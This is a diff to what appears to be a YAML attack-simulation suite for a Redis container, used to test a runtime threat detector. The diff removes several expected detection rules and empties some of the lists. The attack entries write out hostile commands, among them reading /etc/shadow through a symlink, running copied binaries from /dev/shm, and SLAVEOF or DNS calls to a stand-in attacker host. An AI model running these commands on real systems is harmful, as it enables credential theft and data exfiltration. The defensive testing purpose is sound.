@@ -118,10 +118,7 @@ attacks:
     type: cmdinject
     exec:
       command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_redis && chmod +x /dev/shm/malicious_redis && /dev/shm/malicious_redis pwned && rm -f /dev/shm/malicious_redis"]
-    expectedDetections:
-      - ruleID: R1000
-        ruleName: Exec from malicious source
-        containerName: redis
+    expectedDetections: []
 
   # T1059.006 — Lua scripting (reverse shell attempt)
   - name: lua-reverse-shell
@@ -150,9 +147,6 @@ attacks:
         ruleName: Unexpected process launched
         containerName: redis
         command: perl
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: redis
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 4: PERSISTENCE (TA0003) — Config manipulation for persistence
@@ -185,10 +179,7 @@ attacks:
     type: cmdinject
     exec:
       command: ["sh", "-c", "cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis / && rm -f /tmp/drifted_redis"]
-    expectedDetections:
-      - ruleID: R1001
-        ruleName: Exec Binary Not In Base Image
-        containerName: redis
+    expectedDetections: []
 
   # T1574.006 — LD_PRELOAD hijacking
   - name: lua-ld-preload
@@ -212,9 +203,6 @@ attacks:
         return result
     successIndicators: []
     expectedDetections:
-      - ruleID: R1011
-        ruleName: LD Preload Hook
-        containerName: redis
       - ruleID: R0001
         ruleName: Unexpected process launched
         containerName: redis
@@ -263,9 +251,6 @@ attacks:
     exec:
       command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
     expectedDetections:
-      - ruleID: R1010
-        ruleName: Symlink Created Over Sensitive File
-        containerName: redis
       - ruleID: R0001
         ruleName: Unexpected process launched
         containerName: redis
@@ -324,10 +309,7 @@ attacks:
       command: ["SLAVEOF", "evil.attacker.example.com", "6379"]
     successIndicators:
       - responseContains: "OK"
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: redis
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 11: EXFILTRATION (TA0010) — Data exfiltration signals
@@ -338,10 +320,7 @@ attacks:
     type: cmdinject
     exec:
       command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: redis
+    expectedDetections: []
 
   # T1048 — DNS beacon via Lua
   - name: lua-dns-beacon
@@ -364,10 +343,7 @@ attacks:
         cmd:close()
         return result
     successIndicators: []
-    expectedDetections:
-      - ruleID: R0005
-        ruleName: Unexpected domain request
-        containerName: redis
+    expectedDetections: []
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 12: IMPACT (TA0040) — Destruction and crypto mining signals
